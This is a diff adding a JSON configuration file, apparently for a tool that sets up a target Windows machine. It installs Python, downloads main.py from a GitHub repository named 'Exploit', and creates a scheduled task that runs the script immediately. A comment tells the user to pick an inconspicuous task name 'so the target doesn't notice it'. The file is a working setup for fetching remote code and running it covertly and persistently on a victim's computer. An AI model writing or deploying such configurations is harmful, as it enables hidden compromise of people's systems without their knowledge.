@@ -1,0 +1,53 @@
+{
+    // Uncomment or add the dependencies you want to install
+    "dependencies": [
+        {
+            "name": "Python",
+            "command": "python",
+            "package": "Python.Python.3.13"
+        }
+    /*
+        {
+            "name": "Java",
+            "command": "java",
+            "package": "EclipseAdoptium.Temurin.21.JDK"
+        }
+    */
+    /*
+        {
+            "name": "Node.js",
+            "command": "node",
+            "package": "OpenJS.NodeJS.LTS"
+        }
+    */
+    /*
+        {
+            "name": "Go",
+            "command": "go",
+            "package": "GoLang.Go"
+        }
+    */
+    /*
+        {
+            "name": "Git",
+            "command": "git",
+            "package": "Git.Git"
+        }
+    */
+    ],
+    // Add the files you want to download
+    "files": [
+        {
+            "url": "https://raw.githubusercontent.com/0x00-0x00/Exploit/main/main.py",
+            "name": "main.py"
+        }
+    ],
+    // Add the scheduled tasks you want to create
+    "tasks": [
+        {
+            "name": "AppMaintenance", // Make sure the name is insconspicuous so the target doesn't notice it
+            "action": "python main.py",
+            "runNow": true
+        }
+    ]
+}
